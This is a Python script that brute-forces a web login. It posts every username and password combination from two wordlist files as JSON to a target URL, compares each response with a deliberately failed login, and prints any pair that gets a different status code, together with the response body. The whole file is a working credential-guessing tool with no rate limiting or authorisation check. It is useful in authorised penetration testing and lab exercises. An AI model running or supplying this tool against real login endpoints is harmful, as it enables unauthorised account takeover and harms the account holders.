import requests
import argparse
from pathlib import Path
from urllib.parse import urlparse
import sys

####################
# global variables #
####################
found = False

#get bad login response to make the filtering a good response
def bad_request(url):
    data = {
        "email": "ImpossibleEmailqsdazer1234321",
        "password": "ImpossiblePassowrdqsdazer1234321"
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(url, json=data, headers=headers)
    bad_request = {}
    bad_request["status"] = response.status_code
    bad_request["text"] = response.text
    print("Failed HTTP status : "+str(response.status_code))
    print("Failed HTTP body : "+response.text)
    return bad_request

def send(url,username,password,bad_request_data):
    global found 
    data = {
        "email": username,
        "password": password
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(url, json=data, headers=headers)
    if(response.status_code != bad_request_data["status"]):
        print(f"\rSUCCESS username: {username} | password: {password}")
        print("Response Body:", response.text)
        found = True

def is_valid_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
        return parsed.scheme in ("http", "https") and bool(parsed.netloc)
    except Exception:
        return False
    
def load_lines(path):
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]

def main(argv=None):
    if argv is None:
        argv = sys.argv[1:]

    parser = argparse.ArgumentParser(
        description="Example script that accepts host, username file and password file.",
        add_help=False,  # we'll provide a custom --help so we can use -h for host
    )

    parser.add_argument("-h", "--host", dest="host", required=True,
                        help="Target host URL (e.g. http://example.com)")
    parser.add_argument("-u", "--user-file", dest="user_file", required=True,
                        help="Path to username file (one username per line)")
    parser.add_argument("-p", "--pass-file", dest="pass_file", required=True,
                        help="Path to password file (one password per line)")
    args = parser.parse_args(argv)

    host = args.host

    # Validate URL
    if not is_valid_url(args.host):
        parser.error(f"Invalid host URL: {args.host}")

    print("------------")
    print("URL : "+host)
    bad_request_data = bad_request(host)
    print("------------")

    user_path = Path(args.user_file)
    pass_path = Path(args.pass_file)

    file_username = load_lines(user_path)
    numberusers = len(file_username)
    file_password = load_lines(pass_path)
    numberpassword = len(file_password)
    totalnumber = numberusers*numberpassword
    progressvalue = int(totalnumber/100)

    counter = 0
    for user in file_username:
        for password in file_password:
            counter += 1
            if(counter % progressvalue)==0:
                print(f"\rProgress {counter}/{totalnumber}", end="")
            send(host,user,password,bad_request_data)
    print()
    global found 
    if not found:
        print(f"\rFAILED")

    return 0

if __name__ == "__main__":
    raise SystemExit(main())

